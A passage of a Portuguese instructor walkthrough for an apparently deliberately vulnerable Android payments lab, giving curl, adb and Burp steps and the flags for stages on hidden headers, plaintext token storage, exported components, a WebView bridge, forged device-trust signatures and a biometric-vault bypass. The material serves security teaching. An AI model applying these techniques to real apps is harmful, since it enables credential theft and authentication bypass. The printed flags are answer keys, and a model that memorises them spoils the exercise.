10. Salve a evidência (request com o header + response com o checkpoint).

### O que observar

- **Request:** o header extra `X-Obsidian-Recon: mobile-config-review`.
- **Response (JSON):** um objeto novo:
  ```json
  "reconCheckpoint": {
    "stageId": "stage-01-recon",
    "note": "Mobile config review checkpoint reached.",
    "flag": "FLAG{obsidianpay_mobile_recon_01}"
  }
  ```
- Sem o header, o mesmo endpoint responde **sem** esse bloco.

### Por que isso é vulnerável

O endpoint expõe um “modo de revisão” acionado por um **header estático e
adivinhável**, sem qualquer autorização adicional. Em recon mobile, é comum
descobrir headers/parâmetros “internos” que ligam funcionalidades escondidas:
confiar em um header secreto como controle de acesso é frágil.

### Como obter a flag

A flag aparece **diretamente** em `reconCheckpoint.flag` na resposta de
`GET /api/mobile/config` quando — e somente quando — o header
`X-Obsidian-Recon: mobile-config-review` é enviado.

**Flag:** `FLAG{obsidianpay_mobile_recon_01}`

> **Confirmação rápida (instrutor) — curl:**
> ```bash
> curl -s http://127.0.0.1:8102/api/mobile/config \
>   -H 'X-Obsidian-Recon: mobile-config-review' | jq .reconCheckpoint.flag
> # => "FLAG{obsidianpay_mobile_recon_01}"
> ```

### Como submeter a flag

Siga o [modelo único de submissão](#como-submeter-qualquer-flag-modelo-único) com:

```json
{"stageId":"stage-01-recon","flag":"FLAG{obsidianpay_mobile_recon_01}","evidence":"config + header X-Obsidian-Recon"}
```

- **Resultado esperado:** `accepted:true`, `pointsAwarded:100`, `totalScore:100`.

### Evidência obrigatória

- Request do Repeater mostrando o header `X-Obsidian-Recon`.
- Response com o bloco `reconCheckpoint`.
- Resposta do submit com `pointsAwarded:100`.

### Erros comuns

- **Resposta sem `reconCheckpoint`:** o header está com nome/valor errado — deve
  ser exatamente `X-Obsidian-Recon: mobile-config-review`.
- **Não acha o request no history:** o app já tinha a config em cache; force um
  novo login para gerar a chamada (ou use a confirmação por curl).
- **`submit accepted:false`:** flag/`stageId` errados; copie a flag exata da
  resposta, sem espaços.

### Checklist da etapa

- [ ] ação concluída (config capturada e reenviada com o header);
- [ ] vulnerabilidade demonstrada (modo de revisão por header);
- [ ] evidência salva;
- [ ] flag obtida (`FLAG{obsidianpay_mobile_recon_01}`);
- [ ] flag submetida;
- [ ] pontuação confirmada (100 pts).

---

## Stage 02 — Insecure Storage

### Objetivo

Mostrar que o app guarda material de sessão **em texto puro** no dispositivo e que
o “sync de suporte legado” ecoa um checkpoint de armazenamento local quando o
cliente afirma estar fazendo uma “revisão de cache”.

### O que deve estar aberto

- **Backend:** sim.
- **Emulador:** sim.
- **App:** sim (logado).
- **Burp:** sim (caminho principal para o checkpoint).
- **ADB:** sim (para inspecionar o storage local).
- **JADX:** opcional (ver nomes das chaves em `Constants`).

### Onde começar no aplicativo

1. Na **Home**, abra a tela **Suporte** (Support).
2. Use a ação de **sincronizar suporte** (Support Sync) — isso dispara um
   **`POST /api/mobile/support/sync`**, visível no Burp.

### Passo a passo manual

**Parte A — disparar o checkpoint (Burp):**

1. No app (tela Suporte), acione o **Support Sync**.
2. No **Burp > HTTP history**, ache **`POST /api/mobile/support/sync`** →
   **Send to Repeater**.
3. No Repeater, edite o **corpo JSON** para incluir o campo gatilho (mantendo um
   `message` não vazio):
   ```json
   {"message":"storage review","cacheCheckpoint":"local-storage-review"}
   ```
4. **Send.**
5. Observe a resposta: agora há um bloco `localStorageCheckpoint`.
6. Copie `localStorageCheckpoint.flag`.

**Parte B — demonstrar o armazenamento inseguro (ADB):**

7. Abra um terminal no host. Liste o storage privado do app (build debug,
   debuggable):
   ```bash
   adb shell run-as com.obsidianpay.mobile.debug ls -R /data/data/com.obsidianpay.mobile.debug
   ```
8. Leia as **SharedPreferences** (token/perfil em claro):
   ```bash
   adb shell run-as com.obsidianpay.mobile.debug cat shared_prefs/obsidian_session_prefs.xml
   ```
9. Liste as tabelas do **SQLite** local:
   ```bash
   adb shell run-as com.obsidianpay.mobile.debug ls databases/
   ```
   - (Há um `obsidianpay_local.db` com `cached_receipts`, `cached_cards` e
     `debug_events`.)
10. Observe o **arquivo de cache** do último sync:
    ```bash
    adb shell run-as com.obsidianpay.mobile.debug cat cache/obsidian-support-last-sync.json
    ```
11. Salve as saídas como evidência do armazenamento em claro.

### O que observar

- **Response do sync:** o bloco
  ```json
  "localStorageCheckpoint": {
    "stageId": "stage-02-insecure-storage",
    "note": "Local storage cache review checkpoint reached.",
    "flag": "FLAG{obsidianpay_insecure_storage_02}"
  }
  ```
- **No device:** o `obsidian_session_prefs.xml` contém o token de sessão
  (`obsidian.session.token`) e o perfil em **texto puro**; o SQLite guarda `rawJson`
  de recibos/cartões; arquivos de cache guardam payloads.

### Por que isso é vulnerável

Dados sensíveis (token, perfil, caches) ficam **sem criptografia** no
armazenamento do app. Qualquer um com acesso ao dispositivo (root, backup, ou um
build debuggable) lê tudo. Além disso, o backend **confia** no que o cliente
afirma sobre o “cache local” — ele apenas ecoa o checkpoint.

### Como obter a flag

A flag vem **diretamente** em `localStorageCheckpoint.flag` na resposta de
`POST /api/mobile/support/sync` quando o body inclui
`"cacheCheckpoint":"local-storage-review"` (e um `message` não vazio).

**Flag:** `FLAG{obsidianpay_insecure_storage_02}`

> **Confirmação rápida (instrutor) — curl:**
> ```bash
> curl -s -X POST http://127.0.0.1:8102/api/mobile/support/sync \
>   -H 'Content-Type: application/json' \
>   -d '{"message":"storage review","cacheCheckpoint":"local-storage-review"}' \
>   | jq .localStorageCheckpoint.flag
> ```

### Como submeter a flag

[Modelo único de submissão](#como-submeter-qualquer-flag-modelo-único) com:

```json
{"stageId":"stage-02-insecure-storage","flag":"FLAG{obsidianpay_insecure_storage_02}","evidence":"support/sync cacheCheckpoint + shared_prefs em claro"}
```

- **Resultado esperado:** `pointsAwarded:150`.

### Evidência obrigatória

- Request/response do `support/sync` com `localStorageCheckpoint`.
- Saída do `cat shared_prefs/obsidian_session_prefs.xml` mostrando dados em claro.
- Resposta do submit com `pointsAwarded:150`.

### Erros comuns

- **`bad_request` no sync:** falta um `message` não vazio no body.
- **Sem `localStorageCheckpoint`:** o valor de `cacheCheckpoint` está errado —
  deve ser exatamente `local-storage-review`.
- **`run-as: package not debuggable`:** você instalou o build release; use o
  `app-debug.apk` (applicationId `...debug`).

### Checklist da etapa

- [ ] ação concluída (sync com `cacheCheckpoint` + inspeção de storage);
- [ ] vulnerabilidade demonstrada (dados em claro + eco do checkpoint);
- [ ] evidência salva;
- [ ] flag obtida (`FLAG{obsidianpay_insecure_storage_02}`);
- [ ] flag submetida;
- [ ] pontuação confirmada (150 pts).

---

## Stage 03 — Exported Components

### Objetivo

Demonstrar o abuso de **componentes Android exportados** — uma Activity, um
BroadcastReceiver e um ContentProvider que outros apps (ou o ADB) conseguem
acionar sem autenticação.

### O que deve estar aberto

- **Backend:** opcional (os componentes operam localmente, sem rede).
- **Emulador:** sim.
- **App:** instalado.
- **ADB:** sim (caminho principal).
- **JADX:** sim (confirmar o Manifest).
- **Burp / Frida:** não necessários.

### Onde começar no aplicativo

Este stage **não** começa numa tela do app, e sim na **análise do Manifest** e na
**linha de comando (ADB)**. No JADX, abra o **AndroidManifest** e localize os três
componentes com `android:exported="true"`.

### Passo a passo manual

1. No **JADX**, abra o `AndroidManifest` e confirme:
   - Activity exportada **`InternalOpsActivity`** (action
     `com.obsidianpay.mobile.INTERNAL_OPS`);
   - Receiver exportado **`DebugCommandReceiver`** (action
     `com.obsidianpay.mobile.DEBUG_COMMAND`);
   - Provider exportado **`ObsidianNotesProvider`** (authority
     `com.obsidianpay.mobile.provider.notes`).
2. Deixe o emulador ligado. Confirme com `adb devices` (linha terminando em
   `device`).
3. **Explore** os paths já existentes do provider (`/notes`, `/debug`, `/cache`)
   para mapear a superfície:
   ```bash
   adb shell content query --uri content://com.obsidianpay.mobile.provider.notes/notes
   adb shell content query --uri content://com.obsidianpay.mobile.provider.notes/debug
   adb shell content query --uri content://com.obsidianpay.mobile.provider.notes/cache
   ```
   - No `/debug` o token aparece **apenas mascarado** (`token_preview`) — o provider
     nunca devolve o token inteiro nem a flag (limite intencional).
4. **Inicie a Activity exportada em modo checkpoint.** Isso faz a Activity emitir
   a `activityProof` (exibida na tela e gravada no estado local):
   ```bash
   adb shell am start -n com.obsidianpay.mobile.debug/com.obsidianpay.mobile.platform.InternalOpsActivity \
     -a com.obsidianpay.mobile.INTERNAL_OPS \
     --es obsidian.intent.extra.OPERATOR_MODE checkpoint
   ```
   - Leia `activityProof = ...` na tela **Internal Operations** que abre no emulador.
5. **Dispare o BroadcastReceiver** com o comando de checkpoint. Isso grava a
   `receiverProof` no estado local (sem rede, só estado local):
   ```bash
   adb shell am broadcast -a com.obsidianpay.mobile.DEBUG_COMMAND \
     --es command emit_checkpoint_proof
   ```
6. **Leia as três provas consolidadas** no novo path `/checkpoint` do provider.
   A `providerProof` só aparece depois que a Activity **e** o Receiver já rodaram:
   ```bash
   adb shell content query --uri content://com.obsidianpay.mobile.provider.notes/checkpoint
   ```
   - Você verá `activityProof`, `receiverProof` e `providerProof`. Anote os três.
7. **Envie as três provas ao checkpoint do backend** (Burp Repeater ou `curl`,
   com um token válido obtido no login). A flag só volta quando as três batem:
   ```bash
   curl -s -X POST "$BASE_URL/api/mobile/challenge/checkpoint/exported-components" \
     -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
     -d '{"activityProof":"<da Activity>","receiverProof":"<do Receiver>","providerProof":"<do Provider>"}'
   ```
   - Resposta `exported-components-verified` traz `exportedComponentsCheckpoint.flag`.
8. Salve as saídas do ADB, a query `/checkpoint` e a resposta do backend como evidência.

### O que observar

- A Activity exportada **emite uma prova** quando aberta em `OPERATOR_MODE=checkpoint`;
  o Receiver exportado emite outra ao receber `command=emit_checkpoint_proof`.
- O provider **consolida** as três provas em `/checkpoint`, mas só adiciona a
  `providerProof` quando Activity **e** Receiver já foram acionados — exatamente o
  fluxo de abuso dos três componentes exportados.
- O backend valida as três provas e **só então** devolve a flag — que nunca esteve
  no APK nem no provider.

### Por que isso é vulnerável

Componentes `exported="true"` sem permissão podem ser acionados por **qualquer
outro app** instalado, não só pelo próprio app. Isso permite enumerar dados
locais (provider), disparar comandos internos (receiver) e abrir telas internas
(activity) a partir de fora — uma superfície clássica de abuso de plataforma
Android.

### Como obter a flag

**Mecanismo real (Fase 20 — sem inventar comportamento):** os três componentes
exportados produzem provas verificáveis. A Activity (`OPERATOR_MODE=checkpoint`) e
o Receiver (`command=emit_checkpoint_proof`) gravam, cada um, uma prova no estado
local; o ContentProvider as **consolida** no path `/checkpoint` e acrescenta a sua
própria `providerProof` (só quando as outras duas já existem). Enviando as três
provas a `POST /api/mobile/challenge/checkpoint/exported-components` (autenticado),
o **backend** valida e devolve a flag. O provider continua **não** entregando o
token inteiro nem a flag; a flag vive **apenas** no backend.

**Flag:** `FLAG{obsidianpay_exported_components_03}`

> **Nota de instrutor:** o caminho é totalmente reproduzível por um iniciante via
> ADB + Burp/curl — **não** é necessário (nem indicado) abrir `api/src/flags.js`.
> O checkpoint rejeita provas ausentes/incorretas sem vazar a flag.

### Como submeter a flag

[Modelo único de submissão](#como-submeter-qualquer-flag-modelo-único) com:

```json
{"stageId":"stage-03-exported-components","flag":"FLAG{obsidianpay_exported_components_03}","evidence":"adb content query provider.notes + am broadcast DEBUG_COMMAND + am start InternalOpsActivity"}
```

- **Resultado esperado:** `pointsAwarded:200`.

### Evidência obrigatória

- Print do Manifest (JADX) com os três componentes exportados.
- Saída do `am start` (tela Internal Operations mostrando `activityProof`).
- Saída do `am broadcast` (comando `emit_checkpoint_proof`).
- Saída do `content query .../checkpoint` com as três provas.
- Resposta `exported-components-verified` do checkpoint contendo a flag.
- Resposta do submit com `pointsAwarded:200`.

### Erros comuns

- **`Unknown URI` na query:** confira a **authority** e o **path**
  (`content://com.obsidianpay.mobile.provider.notes/checkpoint`).
- **`/checkpoint` sem `providerProof`:** rode **primeiro** a Activity em
  `OPERATOR_MODE=checkpoint` **e** o Receiver com `emit_checkpoint_proof`; a prova
  do provider só aparece com as duas anteriores presentes.
- **`Permission Denial` / `Activity not started`:** confirme que o app instalado
  é o **build debug** correto; o `-n` usa `com.obsidianpay.mobile.debug/...` mas a
  **classe** e a **action** usam o package base `com.obsidianpay.mobile`.
- **400/403 no checkpoint:** envie as **três** provas exatas (sem espaços) e um
  **Bearer token** válido; provas erradas/incompletas são recusadas sem vazar a flag.

### Checklist da etapa

- [ ] ação concluída (provider/receiver/activity acionados via ADB);
- [ ] vulnerabilidade demonstrada (componentes exportados);
- [ ] evidência salva;
- [ ] flag obtida (`FLAG{obsidianpay_exported_components_03}`);
- [ ] flag submetida;
- [ ] pontuação confirmada (200 pts).

---

## Stage 04 — WebView Bridge

### Objetivo

Explorar o **portal de suporte em WebView** e o seu “modo de auditoria da bridge”.
A WebView expõe uma interface JavaScript (`ObsidianBridge`), e o backend revela um
checkpoint quando o portal é aberto com o tópico de auditoria.

### O que deve estar aberto

- **Backend:** sim.
- **Emulador:** sim.
- **App:** sim (logado).
- **Burp:** sim (caminho principal alternativo).
- **JADX:** sim (ver os métodos da bridge).
- **Frida:** opcional (script `05-webview-bridge-observer.js`).

### Onde começar no aplicativo

1. Na **Home**, abra **Web Support** (a WebView do portal de suporte).
2. O app carrega `GET /api/mobile/webview/support?topic=...&message=...` —
   visível no Burp.

### Passo a passo manual

**Caminho principal (deep link abrindo o tópico de auditoria):**

1. Garanta o app instalado e o emulador ligado.
2. Dispare o deep link de suporte já com o tópico de auditoria:
   ```bash
   adb shell am start -a android.intent.action.VIEW \
     -d "obsidianpay://support?topic=bridge-audit&message=cache-review" \
     com.obsidianpay.mobile.debug
   ```
3. O app abre a **Web Support** carregando o portal com `topic=bridge-audit` e
   `message=cache-review`.
4. Na página, observe o bloco **“Bridge audit checkpoint”** com a flag.

**Caminho alternativo (Burp Repeater):**

1. No Burp, ache qualquer `GET /api/mobile/webview/support` → **Send to Repeater**.
2. Ajuste a linha do request para:
   ```
   GET /api/mobile/webview/support?topic=bridge-audit&message=cache-review HTTP/1.1
   ```
3. **Send** e leia o HTML: o bloco `bridgeCheckpoint` contém a flag.

**Análise estática (JADX):**

- Abra `webview/ObsidianSupportBridge.kt` e veja os métodos `@JavascriptInterface`
  (`getSessionSummary`, `getCachedConfig`, etc.) que a página pode chamar via
  `window.ObsidianBridge`.

### O que observar

- **No HTML** do portal, com `topic=bridge-audit&message=cache-review`, aparece:
  ```html
  <div class="card" id="bridgeCheckpoint" data-stage="stage-04-webview-bridge">
    <div class="muted">Bridge audit checkpoint</div>
    <div>FLAG{obsidianpay_webview_bridge_04}</div>
  </div>
  ```
- Dentro do app, o portal detecta `window.ObsidianBridge` (“Mobile bridge
  available”) e os botões chamam métodos da bridge.

### Por que isso é vulnerável

Uma WebView com `addJavascriptInterface` expõe métodos nativos ao conteúdo web. Se
a página (ou o `topic`/`message`) for controlável, o conteúdo web pode acessar
contexto local do app (resumo de sessão, caches). É a clássica exposição de
**JavaScript bridge** em apps mobile.

### Como obter a flag

A flag aparece no bloco `bridgeCheckpoint` do HTML de
`GET /api/mobile/webview/support` quando `topic=bridge-audit` **e**
`message=cache-review`.

**Flag:** `FLAG{obsidianpay_webview_bridge_04}`

> **Confirmação rápida (instrutor) — curl:**
> ```bash
> curl -s 'http://127.0.0.1:8102/api/mobile/webview/support?topic=bridge-audit&message=cache-review' \
>   | grep -o 'FLAG{obsidianpay_webview_bridge_04}'
> ```

### Como submeter a flag

[Modelo único de submissão](#como-submeter-qualquer-flag-modelo-único) com:

```json
{"stageId":"stage-04-webview-bridge","flag":"FLAG{obsidianpay_webview_bridge_04}","evidence":"webview/support topic=bridge-audit bridgeCheckpoint"}
```

- **Resultado esperado:** `pointsAwarded:200`.

### Evidência obrigatória

- Print da WebView (ou HTML do Repeater) com o bloco `bridgeCheckpoint`.
- (Opcional) print do JADX com os métodos `@JavascriptInterface`.
- Resposta do submit com `pointsAwarded:200`.

### Erros comuns

- **Bloco não aparece:** `topic` e `message` precisam ser **exatamente**
  `bridge-audit` e `cache-review`.
- **Deep link não abre a tela certa:** confirme o scheme `obsidianpay://support`
  e o pacote `com.obsidianpay.mobile.debug`.
- **WebView “Standalone (sem app)”:** você abriu o portal fora do app (ex.: no
  navegador) — para ver a bridge ativa, abra dentro do app; mas o bloco
  `bridgeCheckpoint` (a flag) aparece de qualquer forma.

### Checklist da etapa

- [ ] ação concluída (portal aberto no modo de auditoria);
- [ ] vulnerabilidade demonstrada (bridge JS / WebView);
- [ ] evidência salva;
- [ ] flag obtida (`FLAG{obsidianpay_webview_bridge_04}`);
- [ ] flag submetida;
- [ ] pontuação confirmada (200 pts).

---

## Stage 05 — Device Trust

### Objetivo

Entender e reproduzir a **assinatura legada fraca** que o app usa para “provar
confiança do dispositivo”. A assinatura é `sha1(username:deviceId:timestamp:salt)`
com um **salt embutido no app** — forjável offline.

### O que deve estar aberto

- **Backend:** sim.
- **Emulador:** sim.
- **App:** sim (logado).
- **Burp:** sim.
- **JADX:** sim (entender a assinatura).
- **Frida:** não necessário.

### Onde começar no aplicativo

1. Na **Home**, abra a tela **Device Trust**.
2. Toque no botão que **monta a assinatura e chama o device-trust** — isso dispara
   `POST /api/mobile/internal/device-trust`, visível no Burp.

### Passo a passo manual

**Parte A — caminho pelo app (a forma mais simples de ver a flag):**

1. Na tela **Device Trust**, acione a checagem.
2. No **Burp > HTTP history**, ache `POST /api/mobile/internal/device-trust`.
3. Veja a **resposta**: como o app já assina corretamente (tem o salt), a resposta
   é `status: "trusted-legacy"` e inclui `deviceTrustCheckpoint.flag`.

**Parte B — entender de onde vem cada valor (JADX):**

4. Abra `security/HardcodedSecrets.kt`: o **salt** é montado por fragmentos
   (`LEGACY_SIGNING_SALT_PART_*`) → `obsidian-legacy-attestation-2026`; o
   **client id** → `obsidian-mobile-legacy-client`.
5. Abra `security/LegacyRequestSigner.kt`: a assinatura é
   `sha1(username:deviceId:timestamp:salt)` e os headers montados são
   `X-Obsidian-Client/Device/Timestamp/Signature`.
6. **De onde vem cada parte:**
   - `username` = `guest` (usuário logado);
   - `deviceId` = um identificador do dispositivo (qualquer string que você
     também coloque no header `X-Obsidian-Device`);
   - `timestamp` = um número (epoch em ms; qualquer valor serve, desde que seja o
     mesmo na assinatura e no header `X-Obsidian-Timestamp`);
   - `salt` = `obsidian-legacy-attestation-2026` (recuperado do app).

**Parte C — forjar/reproduzir no Burp Repeater:**

7. Calcule a assinatura SHA-1 para valores à sua escolha. Por exemplo, com
   `deviceId = android-emulator-obsidian` e `timestamp = 1700000000000`:
   ```bash
   printf '%s' "guest:android-emulator-obsidian:1700000000000:obsidian-legacy-attestation-2026" | sha1sum
   ```
   - Copie o hash (40 caracteres hex).
8. No Repeater, monte o request:
   ```
   POST /api/mobile/internal/device-trust HTTP/1.1
   Host: 10.0.2.2:8102
   Authorization: Bearer obsidian-mobile-token-guest-1001
   X-Obsidian-Client: obsidian-mobile-legacy-client
   X-Obsidian-Device: android-emulator-obsidian
   X-Obsidian-Timestamp: 1700000000000
   X-Obsidian-Signature: <hash-do-passo-7>
   Content-Type: application/json

   {"deviceId":"android-emulator-obsidian","attestationMode":"legacy"}
   ```
9. **Send.** A resposta `trusted-legacy` inclui `deviceTrustCheckpoint.flag`.
10. Copie a flag.

### O que observar

- **Response aceita:**
  ```json
  "deviceTrustCheckpoint": {
    "stageId": "stage-05-device-trust",
    "flag": "FLAG{obsidianpay_device_trust_05}"
  }
  ```
- Trocar o `deviceId`/`timestamp` (e recalcular o SHA-1) continua sendo aceito —
  prova de que a assinatura é forjável offline.

### Por que isso é vulnerável

A “prova de confiança” usa **SHA-1 sem HMAC e sem nonce**, com um **salt embutido
no cliente**. Quem extrai o salt (análise estática trivial) recalcula a assinatura
para qualquer `deviceId`/`timestamp`. Confiar numa assinatura client-side com
segredo embutido é equivalente a não ter assinatura.

### Como obter a flag

A flag vem em `deviceTrustCheckpoint.flag` na resposta de
`POST /api/mobile/internal/device-trust` quando a assinatura SHA-1 (com o salt
correto) e o `X-Obsidian-Client` legado são aceitos.

**Flag:** `FLAG{obsidianpay_device_trust_05}`

> **Confirmação rápida (instrutor) — curl:**
> ```bash
> SALT='obsidian-legacy-attestation-2026'
> SIG=$(printf '%s' "guest:dev:1700000000000:$SALT" | sha1sum | cut -d' ' -f1)
> curl -s -X POST http://127.0.0.1:8102/api/mobile/internal/device-trust \
>   -H "Authorization: Bearer obsidian-mobile-token-guest-1001" \
>   -H "X-Obsidian-Client: obsidian-mobile-legacy-client" \
>   -H "X-Obsidian-Device: dev" -H "X-Obsidian-Timestamp: 1700000000000" \
>   -H "X-Obsidian-Signature: $SIG" -H 'Content-Type: application/json' \
>   -d '{"deviceId":"dev"}' | jq .deviceTrustCheckpoint.flag
> ```

### Como submeter a flag

[Modelo único de submissão](#como-submeter-qualquer-flag-modelo-único) com:

```json
{"stageId":"stage-05-device-trust","flag":"FLAG{obsidianpay_device_trust_05}","evidence":"assinatura sha1 legacy forjada aceita pelo device-trust"}
```

- **Resultado esperado:** `pointsAwarded:250`.

### Evidência obrigatória

- Print do JADX com o salt fragmentado e o esquema de assinatura.
- Request do Repeater com os headers `X-Obsidian-*` e a assinatura.
- Response `trusted-legacy` com `deviceTrustCheckpoint`.
- Resposta do submit com `pointsAwarded:250`.

### Erros comuns

- **403 “Invalid legacy device-trust signature”:** o `deviceId`/`timestamp` usados
  na assinatura não batem com os enviados nos headers; recalcule garantindo os
  **mesmos valores**.
- **403 “Unknown or missing legacy mobile client”:** falta/erro no
  `X-Obsidian-Client: obsidian-mobile-legacy-client`.
- **Hash com espaços/quebras:** ao copiar do `sha1sum`, pegue só os 40 caracteres
  hex (sem o nome do arquivo/“-”).

### Checklist da etapa

- [ ] ação concluída (assinatura reproduzida e aceita);
- [ ] vulnerabilidade demonstrada (assinatura fraca com salt embutido);
- [ ] evidência salva;
- [ ] flag obtida (`FLAG{obsidianpay_device_trust_05}`);
- [ ] flag submetida;
- [ ] pontuação confirmada (250 pts).

---

## Stage 06 — Biometric Vault

### Objetivo

Mostrar que o **Secure Vault** confia na **asserção de autenticação local** do
cliente. O servidor não verifica biometria de forma independente: basta o cliente
afirmar `localAuth=true`.

### O que deve estar aberto

- **Backend:** sim.
- **Emulador:** sim.
- **App:** sim (logado).
- **Burp:** sim (caminho principal do bypass).
- **JADX:** sim (ver `LocalAuthState`/`BiometricGate`).
- **Frida:** opcional (`02-biometric-vault-bypass.js`).

### Onde começar no aplicativo

1. Na **Home**, abra **Secure Vault**.
2. Tente **Unlock with Biometric** (scaffold — sempre “disponível”) ou
   **Unlock with PIN** (o PIN fraco é `0420`, visível no JADX em
   `LocalAuthState`).
3. O app chama `POST /api/mobile/internal/vault-mobile/unlock` — visível no Burp.

### Passo a passo manual

**Caminho pelo app:**

1. No **Secure Vault**, faça o unlock (biometric scaffold ou PIN `0420`).
2. No Burp, veja a resposta de `vault-mobile/unlock`: `status:
   "vault-access-granted"` com `vaultCheckpoint.flag`.

**Caminho do bypass (Burp Repeater) — demonstra a confiança indevida:**

3. Pegue o `POST /api/mobile/internal/vault-mobile/unlock` → **Send to Repeater**.
4. Edite o body para afirmar a autenticação local sem ter feito biometria real:
   ```json
   {"localAuth":true,"vaultUnlocked":true,"method":"bypass","authDecision":"granted"}
   ```
5. **Send.** A resposta inclui `vaultCheckpoint.flag`.

**Caminho via Frida (quando disponível):** o script
`02-biometric-vault-bypass.js` força `validateFallbackPin`/`canUseBiometric`, de
modo que o próprio app envie `localAuth=true`.

### O que observar

- **Response:**
  ```json
  "vaultCheckpoint": {
    "stageId": "stage-06-biometric-vault",
    "flag": "FLAG{obsidianpay_biometric_vault_06}"
  }
  ```
- Enviar `localAuth=true` **diretamente** (sem passar por biometria) é aceito do
  mesmo jeito.

### Por que isso é vulnerável

O servidor delega a decisão de segurança a um **booleano client-side**
(`localAuth`). Um cliente malicioso (ou um hook Frida, ou um request forjado) seta
`localAuth=true` sem nunca autenticar. Estado de auth local também fica em
SharedPreferences em claro (`obsidian.vault.unlocked`). “Prova” de auth feita no
cliente não é prova para o servidor.

### Como obter a flag

A flag vem em `vaultCheckpoint.flag` na resposta de
`POST /api/mobile/internal/vault-mobile/unlock` quando `localAuth=true` com uma
decisão coerente (`vaultUnlocked:true` ou `authDecision:"granted"`).

**Flag:** `FLAG{obsidianpay_biometric_vault_06}`

> **Confirmação rápida (instrutor) — curl:**
> ```bash
> curl -s -X POST http://127.0.0.1:8102/api/mobile/internal/vault-mobile/unlock \
>   -H "Authorization: Bearer obsidian-mobile-token-guest-1001" \
>   -H 'Content-Type: application/json' \
>   -d '{"localAuth":true,"vaultUnlocked":true,"method":"bypass","authDecision":"granted"}' \
>   | jq .vaultCheckpoint.flag
> ```

### Como submeter a flag

[Modelo único de submissão](#como-submeter-qualquer-flag-modelo-único) com:

```json
{"stageId":"stage-06-biometric-vault","flag":"FLAG{obsidianpay_biometric_vault_06}","evidence":"localAuth=true aceito pelo servidor (sem biometria real)"}
```

- **Resultado esperado:** `pointsAwarded:250`.

### Evidência obrigatória

- Request do Repeater com `localAuth:true`.
- Response `vault-access-granted` com `vaultCheckpoint`.
- (Opcional) print do JADX com o PIN `0420` em `LocalAuthState`.
- Resposta do submit com `pointsAwarded:250`.

### Erros comuns

- **403 “requires a successful local authentication assertion”:** faltou
  `localAuth:true` no body.
- **Sem `vaultCheckpoint`:** envie uma decisão coerente (`vaultUnlocked:true` ou
  `authDecision:"granted"`).
- **503 “Mobile vault is not enabled”:** o feature flag do vault está desligado no
  backend — confirme que está usando o backend padrão do lab.

### Checklist da etapa

- [ ] ação concluída (unlock aceito via asserção local);
- [ ] vulnerabilidade demonstrada (servidor confia em `localAuth`);
- [ ] evidência salva;
- [ ] flag obtida (`FLAG{obsidianpay_biometric_vault_06}`);
- [ ] flag submetida;
- [ ] pontuação confirmada (250 pts).

---

## Stage 07 — Network/Pinning

### Objetivo

Acessar o **perfil de rede** interno e o seu “modo de revisão de pinning (Burp)”.
Entender o que é **scaffold/report-only** (não bloqueia nada) e o que é
**realmente necessário** para a flag (um header de revisão).

### O que deve estar aberto

- **Backend:** sim.
- **Emulador:** sim.
- **App:** sim (logado).
- **Burp:** sim (caminho principal).
- **JADX:** sim (ver `PinningPolicy`).
- **Frida:** opcional (`03-network-pinning-observer.js`).

### Onde começar no aplicativo

1. Na **Home**, abra **API Host**.
2. Use **Fetch Network Profile** — isso dispara
   `GET /api/mobile/internal/network-profile`, visível no Burp.

### Passo a passo manual

1. No app (API Host), toque em **Fetch Network Profile**.
2. No Burp, ache `GET /api/mobile/internal/network-profile` → **Send to Repeater**.
3. Veja a resposta padrão: `pinningMode: "report-only"`, `cleartextAllowed: true`,
   `bypassHintIds: [...]` — **mas sem flag** (isto é o scaffold/report-only).
4. Adicione o header de revisão de pinning via Burp:
   ```
   X-Obsidian-Network-Review: burp-pinning-check
   ```
5. **Send.** Agora a resposta inclui `networkCheckpoint.flag`.
6. (JADX) Abra `network/PinningPolicy.kt`: `currentMode()` é
   `disabled-local-lab` e `shouldAttachCertificatePinner()` retorna **false** para
   URLs `http://` — por isso o Burp consegue ver o tráfego (não há pinning real).

### O que observar

- **Sem o header:** perfil de rede normal (report-only), **sem** checkpoint.
- **Com o header `X-Obsidian-Network-Review: burp-pinning-check`:**
  ```json
  "networkCheckpoint": {
    "stageId": "stage-07-network-pinning",
    "flag": "FLAG{obsidianpay_network_pinning_07}"
  }
  ```

### Por que isso é vulnerável

Aqui o ponto didático tem duas camadas:

- **Scaffold/report-only (não é a “vulnerabilidade” que dá a flag):** o pinning
  está **desabilitado** no lab local (HTTP), e o perfil só **descreve** a postura
  e os hints de bypass. Isso ensina como observar pinning e onde hookar (Frida),
  mas não bloqueia nada.
- **O que realmente dá a flag:** um **header de revisão** estático e adivinhável
  que destrava o checkpoint — de novo, um “modo interno” acionável por quem
  conhece o header.

### Como obter a flag

A flag vem em `networkCheckpoint.flag` na resposta de
`GET /api/mobile/internal/network-profile` quando o header
`X-Obsidian-Network-Review: burp-pinning-check` é enviado (com Bearer válido).

**Flag:** `FLAG{obsidianpay_network_pinning_07}`

> **Confirmação rápida (instrutor) — curl:**
> ```bash
> curl -s http://127.0.0.1:8102/api/mobile/internal/network-profile \
>   -H "Authorization: Bearer obsidian-mobile-token-guest-1001" \
>   -H 'X-Obsidian-Network-Review: burp-pinning-check' \
>   | jq .networkCheckpoint.flag
> ```

### Como submeter a flag

[Modelo único de submissão](#como-submeter-qualquer-flag-modelo-único) com:

```json
{"stageId":"stage-07-network-pinning","flag":"FLAG{obsidianpay_network_pinning_07}","evidence":"network-profile + header X-Obsidian-Network-Review"}
```

- **Resultado esperado:** `pointsAwarded:250`.

### Evidência obrigatória

- Response do network-profile **sem** o header (report-only).
- Response **com** o header, mostrando `networkCheckpoint`.
- (Opcional) print do JADX com `PinningPolicy` em `disabled-local-lab`.
- Resposta do submit com `pointsAwarded:250`.

### Erros comuns

- **Sem `networkCheckpoint`:** o header deve ser exatamente
  `X-Obsidian-Network-Review: burp-pinning-check`.
- **401 unauthorized:** falta o `Authorization: Bearer ...` (este endpoint exige
  token).
- **Esperar “bypassar pinning” para ganhar a flag:** não é necessário — o pinning
  é report-only; a flag vem do header de revisão.

### Checklist da etapa

- [ ] ação concluída (network-profile com o header de revisão);
- [ ] vulnerabilidade demonstrada (modo de revisão + pinning report-only);
- [ ] evidência salva;
- [ ] flag obtida (`FLAG{obsidianpay_network_pinning_07}`);
- [ ] flag submetida;
- [ ] pontuação confirmada (250 pts).

---

## Stage 08 — App Integrity

### Objetivo

Demonstrar que a verificação de **integridade do app** é **client-asserted /
report-only**: o servidor confia no relatório que o cliente envia, e esse
relatório é totalmente **patchável**.

### O que deve estar aberto

